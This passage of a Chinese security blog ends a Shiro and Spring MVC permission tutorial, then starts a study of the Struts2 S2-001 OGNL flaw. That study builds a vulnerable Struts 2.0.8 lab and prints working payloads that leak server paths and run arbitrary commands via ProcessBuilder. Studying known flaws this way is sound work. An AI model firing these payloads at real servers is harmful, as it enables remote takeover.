/&gt;</span><br><span class="line">		&lt;property name=&quot;arguments&quot; ref=&quot;securityManager&quot; /&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;bean id=&quot;databaseRealm&quot; class=&quot;com.how2java.realm.DatabaseRealm&quot;&gt;</span><br><span class="line">	&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">	&lt;!-- 保证实现了Shiro内部lifecycle函数的bean执行 --&gt;</span><br><span class="line">	&lt;bean id=&quot;lifecycleBeanPostProcessor&quot; class=&quot;org.apache.shiro.spring.LifecycleBeanPostProcessor&quot; /&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>
<h3 id="springMVC-xml"><a href="#springMVC-xml" class="headerlink" title="springMVC.xml"></a>springMVC.xml</h3><p>1.springmvc的基本配置<br>2.增加对shiro的支持(这样在控制器<code>@Controller</code>上,使用像<code>@RequireRole</code>这样的注解,来表示某个方法必须有相关的角色才能访问。<code>@RequiresPermissions(&quot;deleteOrder&quot;)</code>表示具有<code>deleteOrder</code>的权限才能访问)<br>3.指定了异常处理类<code>DefaultExceptionHandler</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--启用shiro注解 --&gt;</span><br><span class="line">&lt;bean</span><br><span class="line">	class=&quot;org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator&quot;</span><br><span class="line">	depends-on=&quot;lifecycleBeanPostProcessor&quot;&gt;</span><br><span class="line">	&lt;property name=&quot;proxyTargetClass&quot; value=&quot;true&quot; /&gt;</span><br><span class="line">&lt;/bean&gt;</span><br><span class="line">&lt;bean</span><br><span class="line">	class=&quot;org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor&quot;&gt;</span><br><span class="line">	&lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot; /&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<h3 id="PageController与LoginController"><a href="#PageController与LoginController" class="headerlink" title="PageController与LoginController"></a>PageController与LoginController</h3><p>因为使用SSM,所以Jsp文件都放在WEB-INF/jsp下面,而这个位置是无法通过浏览器直接访问的,所以专门做这么一个类,便于访问这些Jsp页面。且使用<strong>权限注解</strong>:<code>@RequiresRoles(&quot;admin&quot;)  @RequiresPermissions(&quot;deleteOrder&quot;)</code>表明访问deletePro需要admin角色,访问deleteOrder需要权限<strong>deleteOrder</strong><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.33.45-image.png" alt="2019-03-02.20.33.45-image.png"><br>LoginController.java<br>获取客户端传输过来的账号密码进行验证,正确则跳转到index,错误则返回login.jsp<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.39.01-image.png" alt="2019-03-02.20.39.01-image.png"></p>
<h3 id="DatabaseRealm"><a href="#DatabaseRealm" class="headerlink" title="DatabaseRealm"></a>DatabaseRealm</h3><p>真正做验证与授权的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public class DatabaseRealm extends AuthorizingRealm &#123;</span><br><span class="line"></span><br><span class="line">	@Autowired</span><br><span class="line">	private UserService userService;</span><br><span class="line">	@Autowired</span><br><span class="line">	private RoleService roleService;</span><br><span class="line">	@Autowired</span><br><span class="line">	private PermissionService permissionService;</span><br><span class="line"></span><br><span class="line">	//授权</span><br><span class="line">	@Override</span><br><span class="line">	protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principalCollection) &#123;</span><br><span class="line">		//能进入到这里，表示账号已经通过验证了</span><br><span class="line">		String userName =(String) principalCollection.getPrimaryPrincipal();</span><br><span class="line">		//通过service获取用户的角色和权限</span><br><span class="line">		Set&lt;String&gt; permissions = permissionService.listPermissions(userName);</span><br><span class="line">		Set&lt;String&gt; roles = roleService.listRoles(userName);</span><br><span class="line">		</span><br><span class="line">		//授权对象</span><br><span class="line">		SimpleAuthorizationInfo s = new SimpleAuthorizationInfo();</span><br><span class="line">		//把通过service获取到的角色和权限放进去</span><br><span class="line">		s.setStringPermissions(permissions);</span><br><span class="line">		s.setRoles(roles);</span><br><span class="line">		return s;</span><br><span class="line">	&#125;</span><br><span class="line">	//认证</span><br><span class="line">	@Override</span><br><span class="line">	protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123;</span><br><span class="line">		//获取账号密码</span><br><span class="line">		System.out.println(&quot;调用认证方法&quot;);</span><br><span class="line">		UsernamePasswordToken t = (UsernamePasswordToken) token;</span><br><span class="line">		String userName= token.getPrincipal().toString();</span><br><span class="line">		String password= new String( t.getPassword());</span><br><span class="line">		//获取数据库中的密码</span><br><span class="line">		String passwordInDB = userService.getPassword(userName);</span><br><span class="line">		//如果为空就是账号不存在，如果不相同就是密码错误，但是都抛出AuthenticationException，而不是抛出具体错误原因，免得给破解者提供帮助信息</span><br><span class="line">		if(null==passwordInDB || !passwordInDB.equals(password)) </span><br><span class="line">			throw new AuthenticationException();</span><br><span class="line">		</span><br><span class="line">		//认证信息里存放账号密码, getName() 是当前Realm的继承方法,通常返回当前类名 :databaseRealm</span><br><span class="line">		SimpleAuthenticationInfo a = new SimpleAuthenticationInfo(userName,password,getName());</span><br><span class="line">		return a;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="异常处理DefaultExceptionHandler"><a href="#异常处理DefaultExceptionHandler" class="headerlink" title="异常处理DefaultExceptionHandler"></a>异常处理DefaultExceptionHandler</h3><p>当发生了UnauthorizedException 异常的时候,就表示访问了无授权的资源,那么就会跳转到unauthorized.jsp，而在unauthorized.jsp中就会把变量ex取出来。                        </p>
<h5 id="异常处理的声明"><a href="#异常处理的声明" class="headerlink" title="异常处理的声明"></a>异常处理的声明</h5><p>在SpringMVC.xml中声明:            </p>
<pre><code>&lt;bean id=&quot;exceptionHandlerExceptionResolver&quot; class=&quot;org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver&quot;&gt;
&lt;/bean&gt;
&lt;bean class=&quot;com.how2java.exception.DefaultExceptionHandler&quot;/&gt; 
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-02.20.05.21-image.png" alt="2019-03-02.20.05.21-image.png"></p>
<p>上面演示的是基于注解方式的,哪里需要权限,加上<code>@RequirePermission</code>与<code>@RequireRole</code>就行,但是在做一些中大项目时,这种方式就有了局限性,即每次权限配置更改后,都要进行修改代码,重新编译。这种方式肯定是不好的。所以,我们可以通过另外一种动态配置,基于URL的配置权限。                                </p>
<h2 id="基于URL的配置权限"><a href="#基于URL的配置权限" class="headerlink" title="基于URL的配置权限"></a>基于URL的配置权限</h2><p>上面的代码进行讲解:                </p>
<h4 id="1-先将基于注释的权限配置语句删除"><a href="#1-先将基于注释的权限配置语句删除" class="headerlink" title="1.先将基于注释的权限配置语句删除"></a>1.先将基于注释的权限配置语句删除</h4><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.14.51.33-image.png" alt="2019-03-03.14.51.33-image.png"></p>
<h4 id="2-在PermissionService新增方法"><a href="#2-在PermissionService新增方法" class="headerlink" title="2.在PermissionService新增方法"></a>2.在PermissionService新增方法</h4><p>新增两个方法<code>needInterceptor(String url) listPermissionUrls(String username)</code>,其功能为判断传入的url是否需要权限才能访问与根据username列出用户所能访问的url集合    </p>
<p>在PermissionServiceImpl中实现这两个函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public boolean needIntercepter(String requestUrl) &#123;</span><br><span class="line">        List&lt;Permission&gt; permissions = list();</span><br><span class="line">        for (Permission permission : permissions)&#123;</span><br><span class="line">            if(permission.getUrl().equals(requestUrl))&#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Set&lt;String&gt; listPermissionUrls(String userName) &#123;</span><br><span class="line">        Set&lt;String&gt; result = new HashSet&lt;&gt;();</span><br><span class="line">        List&lt;Role&gt; roles = roleService.listRoles(userName);</span><br><span class="line">        List&lt;RolePermission&gt; rolePermissions = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        for (Role role : roles) &#123;</span><br><span class="line">            RolePermissionExample example = new RolePermissionExample();</span><br><span class="line">            example.createCriteria().andRidEqualTo(role.getId());</span><br><span class="line">            List&lt;RolePermission&gt; rps= rolePermissionMapper.selectByExample(example);</span><br><span class="line">            rolePermissions.addAll(rps);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for (RolePermission rolePermission : rolePermissions) &#123;</span><br><span class="line">            Permission p = permissionMapper.selectByPrimaryKey(rolePermission.getPid());</span><br><span class="line">            result.add(p.getUrl());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="3-url过滤器URLPathMatchingFilter"><a href="#3-url过滤器URLPathMatchingFilter" class="headerlink" title="3.url过滤器URLPathMatchingFilter"></a>3.url过滤器URLPathMatchingFilter</h4><p>继承自shiro的内置过滤器PathMatchingFilter。<br>思路:</p>
<pre><code>a.如果没有登陆,就跳转到登陆界面        
b.如果当前访问路径不在权限系统维护就允许访问        
c.当前用户拥有的权限路径不包含访问地址,则跳转到/unauthorized,否则就允许访问。            
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package com.how2java.filter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import com.how2java.service.PermissionService;</span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authz.UnauthorizedException;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.apache.shiro.web.filter.PathMatchingFilter;</span><br><span class="line">import org.apache.shiro.web.util.WebUtils;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import java.util.Set;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@WebFilter(filterName = &quot;URLPathMatchingFilter&quot;)</span><br><span class="line">public class URLPathMatchingFilter extends PathMatchingFilter &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    PermissionService permissionService;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected boolean onPreHandle(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123;</span><br><span class="line">        String requestURL = getPathWithinApplication(request);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">        //判断是否登陆</span><br><span class="line">        if(!subject.isAuthenticated())&#123;</span><br><span class="line">            //未登陆 跳转到登陆页面</span><br><span class="line">            WebUtils.issueRedirect(request,response,&quot;/login&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //判断url权限</span><br><span class="line">        boolean needPermission = permissionService.needIntercepter(requestURL);</span><br><span class="line">        if(!needPermission)&#123;</span><br><span class="line">            //不需验证 放行</span><br><span class="line">            return true;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            boolean hasPermission = false;</span><br><span class="line">            String username = subject.getPrincipal().toString();</span><br><span class="line">            Set&lt;String&gt; permissionUrls = permissionService.listPermissionUrls(username);</span><br><span class="line">            for(String url : permissionUrls)&#123;</span><br><span class="line">                if (url.equals(requestURL))&#123;</span><br><span class="line">                    hasPermission = true;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (hasPermission)</span><br><span class="line">                return true;</span><br><span class="line">            else &#123;</span><br><span class="line">                UnauthorizedException ex = new UnauthorizedException(&quot;当前用户没有访问路径:&quot; + requestURL + &quot;的权限&quot;);</span><br><span class="line">                subject.getSession().setAttribute(&quot;ex&quot;,ex);</span><br><span class="line">                WebUtils.issueRedirect(request,response,&quot;/unauthorized&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return super.onPreHandle(request, response, mappedValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-applicationContext-shiro-xml"><a href="#4-applicationContext-shiro-xml" class="headerlink" title="4.applicationContext-shiro.xml"></a>4.applicationContext-shiro.xml</h4><p>在配置文件中声明URL过滤器及过滤规则<br> <!-- url过滤器 --></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean id=&quot;urlPathMatchingFilter&quot; class=&quot;com.how2java.filter.URLPathMatchingFilter&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;entry key=&quot;url&quot; value-ref=&quot;urlPathMatchingFilter&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--所有的请求(除去配置的静态资源请求或请求地址为anon的请求)都要通过过滤器url --&gt;</span><br><span class="line">            /** = url</span><br></pre></td></tr></table></figure>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>配置好tomcat启动后访问:<code>http://localhost:8080/listProduct</code>,由于没有登陆就会跳转到我们配置好的登陆页面<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.15.27.14-image.png" alt="2019-03-03.15.27.14-image.png"></p>
<p>若当前登陆用户无访问路径的权限:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-03.15.26.59-image.png" alt="2019-03-03.15.26.59-image.png"></p>
<p>完成上面的代码后,对Shiro有了一定的了解,更多的东西以后再分享。                </p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/Struts2-001漏洞分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/01/Struts2-001漏洞分析/" itemprop="url">Struts2_RCE漏洞分析1(s2-001)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-01T08:15:41+08:00">
                2019-03-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>学习Java安全，先分析些经典漏洞看看</p>
</blockquote>
<hr>
<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞页面信息:            <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a><br>漏洞成因:Remote code exploit on form validation error<br>漏洞影响:<br>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Idea+Maven            </p>
<p>项目结构:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.22.24.59-image.png" alt="2019-03-28.22.24.59-image.png"></p>
<p>web.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt;</span><br><span class="line">  &lt;display-name&gt;S2-001 Example&lt;/display-name&gt;</span><br><span class="line">  &lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt;</span><br><span class="line">  &lt;/filter&gt;</span><br><span class="line">  &lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;struts2&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/filter-mapping&gt;</span><br><span class="line">  &lt;welcome-file-list&gt;</span><br><span class="line">    &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;</span><br><span class="line">  &lt;/welcome-file-list&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></p>
<p>struts.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE struts PUBLIC</span><br><span class="line">        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span><br><span class="line">        &quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;&gt;</span><br><span class="line">&lt;struts&gt;</span><br><span class="line">    &lt;package name=&quot;S2-001&quot; extends=&quot;struts-default&quot;&gt;</span><br><span class="line">        &lt;action name=&quot;login&quot; class=&quot;main.com.test.action.LoginAction&quot;&gt;</span><br><span class="line">            &lt;result name=&quot;success&quot;&gt;welcome.jsp&lt;/result&gt;</span><br><span class="line">            &lt;result name=&quot;error&quot;&gt;index.jsp&lt;/result&gt;</span><br><span class="line">        &lt;/action&gt;</span><br><span class="line">    &lt;/package&gt;</span><br><span class="line">&lt;/struts&gt;</span><br></pre></td></tr></table></figure></p>
<p>pom.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.11&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;2.0.8&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>
<p>index.jsp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">         pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-001&quot;&gt;https://cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;s:form action=&quot;login&quot;&gt;</span><br><span class="line">    &lt;s:textfield name=&quot;username&quot; label=&quot;username&quot; /&gt;</span><br><span class="line">    &lt;s:textfield name=&quot;password&quot; label=&quot;password&quot; /&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=%25&#123;1+1&#125;&amp;password=1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-28.16.28.32-image.png" alt="2019-03-28.16.28.32-image.png"></p>
<p>其他payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取tomcat路径:</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;		</span><br><span class="line"></span><br><span class="line">获取web路径:</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;			</span><br><span class="line"></span><br><span class="line">命令执行:</span><br><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line">将其中的whami改为其他命令即可。</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>最终变量发生变化的部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#\xwork-2.0.3.jar!\com\opensymphony\xwork2\util\TextParseUtil.class 31行</span><br><span class="line">public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator) &#123;</span><br><span class="line">        Object result = expression;</span><br><span class="line"></span><br><span class="line">        while(true) &#123;</span><br><span class="line">            int start = expression.indexOf(open + &quot;&#123;&quot;);</span><br><span class="line">            int length = expression.length();</span><br><span class="line">            int x = start + 2;</span><br><span class="line">            int count = 1;</span><br><span class="line"></span><br><span 